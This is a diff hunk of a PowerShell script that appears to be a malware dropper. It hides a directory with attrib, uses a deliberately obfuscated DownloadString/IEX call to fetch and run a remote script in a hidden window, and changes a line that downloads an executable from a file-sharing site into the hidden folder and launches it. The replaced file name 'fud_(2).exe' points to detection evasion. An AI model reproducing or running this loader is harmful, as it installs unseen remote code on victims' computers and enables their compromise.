@@ -73,7 +73,7 @@ attrib +h +s $dir
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/downloadfile.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
-Invoke-WebRequest -Uri "https://anonsharing.com/file/1e83b5a60a718fd1/fud_(2).exe" -OutFile "$dir\prysmax.exe"; Start-Process "$dir\prysmax.exe"
+Invoke-WebRequest -Uri "https://anonsharing.com/file/e43dc01b44ba1656/hello.exe" -OutFile "$dir\prysmaxx.exe"; Start-Process "$dir\prysmaxx.exe"
 
 
 
